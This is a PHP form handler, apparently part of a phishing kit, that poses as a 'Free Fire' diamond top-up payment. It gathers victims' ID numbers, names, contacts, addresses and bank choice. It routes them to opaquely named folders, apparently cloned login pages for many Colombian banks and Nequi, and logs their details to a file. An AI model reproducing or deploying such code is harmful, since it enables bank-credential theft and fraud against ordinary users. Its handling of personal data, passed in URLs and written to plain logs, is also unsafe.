<?php
// procesar.php - Procesamiento de recargas Free Fire
session_start();
ob_start();

// Verificar que venga del formulario
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    error_log("procesar.php: Método no válido, redirigiendo a index.php");
    header('Location: index.php');
    exit;
}

error_log("procesar.php: Iniciando procesamiento de Free Fire");
error_log("procesar.php: POST data: " . json_encode($_POST));

// Obtener datos del formulario
$formData = [
    'tipo_doc' => $_POST['tipo_doc'] ?? '',
    'numero_doc' => $_POST['cedula'] ?? '',
    'nombres' => $_POST['nombres'] ?? '',
    'apellidos' => $_POST['apellidos'] ?? '',
    'correo' => $_POST['correo'] ?? '',
    'telefono' => $_POST['telefono'] ?? '',
    'celular' => $_POST['celular'] ?? '',
    'direccion' => $_POST['direccion'] ?? '',
    'pais' => $_POST['pais'] ?? '',
    'ciudad' => $_POST['ciudad'] ?? '',
    'tipo_persona' => $_POST['tipo_persona'] ?? '',
    'banco' => $_POST['banco'] ?? '',
    // Datos de Free Fire
    'diamonds' => $_POST['diamonds'] ?? 0,
    'bonus' => $_POST['bonus'] ?? 0,
    'price' => $_POST['price'] ?? '',
    'total' => $_POST['total'] ?? '',
    'playerId' => $_POST['playerId'] ?? '',
    'playerName' => $_POST['playerName'] ?? '',
    'region' => $_POST['region'] ?? '',
    'promoCode' => $_POST['promoCode'] ?? '',
    'descripcion' => 'Recarga Free Fire - ' . ($_POST['diamonds'] ?? 0) . ' diamantes',
    'timestamp' => date('Y-m-d H:i:s')
];

// Guardar en sesión para que los bancos puedan acceder
$_SESSION['pse_data'] = $formData;
$_SESSION['freefire_data'] = $formData;

// Redirigir según banco seleccionado usando folders
$banco_seleccionado = $formData['banco'];
error_log("Banco seleccionado: " . $banco_seleccionado);

$bank_routes = [
    'avvillas' => ['folder' => 'b-34f1', 'ext' => 'html'],
    'bbva' => ['folder' => 'b-34f13', 'ext' => 'php'],
    'caja-social' => ['folder' => 'b-34f2', 'ext' => 'html'],
    'bogota' => ['folder' => 'b-34f4', 'ext' => 'html'],
    'davivienda' => ['folder' => 'b-34f10', 'ext' => 'html'],
    'occidente' => ['folder' => 'b-34f14', 'ext' => 'html'],
    'falabella' => ['folder' => 'b-34f5', 'ext' => 'html'],
    'finandina' => ['folder' => 'b-34f6', 'ext' => 'html'],
    'itau' => ['folder' => 'b-34f7', 'ext' => 'html'],
    'mundo-mujer' => ['folder' => 'b-34f01', 'ext' => 'html'],
    'popular' => ['folder' => 'b-34f18', 'ext' => 'html'],
    'serfinanza' => ['folder' => 'b-34f16', 'ext' => 'html'],
    'union' => ['folder' => 'b-34f0', 'ext' => 'html'],
    'bancolombia' => ['folder' => 'b-34f9', 'ext' => 'html'],
    'davibank' => ['folder' => 'b-34f12', 'ext' => 'html'],
    'lulo' => ['folder' => 'b-34f02', 'ext' => 'html'],
    'scotiabank-colpatria' => ['folder' => 'b-34f12', 'ext' => 'html'],
    'nequi' => ['folder' => 'nequi-1/', 'ext' => 'php']
];

// Para Free Fire, manejar Nequi específicamente
if ($formData['banco'] === 'nequi') {
    // Redirigir a la carpeta de Nequi
    $params = http_build_query([
        'tipo_doc' => $formData['tipo_doc'],
        'cedula' => $formData['numero_doc'],
        'nombres' => $formData['nombres'],
        'apellidos' => $formData['apellidos'],
        'correo' => $formData['correo'],
        'telefono' => $formData['telefono'],
        'celular' => $formData['celular'],
        'direccion' => $formData['direccion'],
        'pais' => $formData['pais'],
        'ciudad' => $formData['ciudad'],
        'tipo_persona' => $formData['tipo_persona'],
        'monto' => $formData['price'], // Usar el precio formateado
        'descripcion' => $formData['descripcion'],
        // Datos adicionales de Free Fire
        'diamonds' => $formData['diamonds'],
        'bonus' => $formData['bonus'],
        'playerId' => $formData['playerId'],
        'playerName' => $formData['playerName']
    ]);

    $redirect_url = 'transaction/nequi-1/?' . $params;
    error_log("procesar.php: Redirigiendo a Nequi: " . $redirect_url);
    header('Location: ' . $redirect_url);
    exit;
}

// Para otros bancos o modo de prueba, mostrar confirmación
error_log("procesar.php: Datos de Free Fire guardados en sesión");

// Crear un archivo de log con los datos para verificar
$logData = date('Y-m-d H:i:s') . " - Free Fire Payment\n";
$logData .= "Player: " . $formData['playerName'] . " (ID: " . $formData['playerId'] . ")\n";
$logData .= "Diamonds: " . $formData['diamonds'] . " (Bonus: " . $formData['bonus'] . ")\n";
$logData .= "Amount: " . $formData['price'] . "\n";
$logData .= "Bank: " . $formData['banco'] . "\n";
$logData .= "Email: " . $formData['correo'] . "\n\n";

file_put_contents('freefire_payments.log', $logData, FILE_APPEND);

// Redirigir a página de confirmación
header('Location: success.php?banco=' . urlencode($formData['banco']));

exit;
?>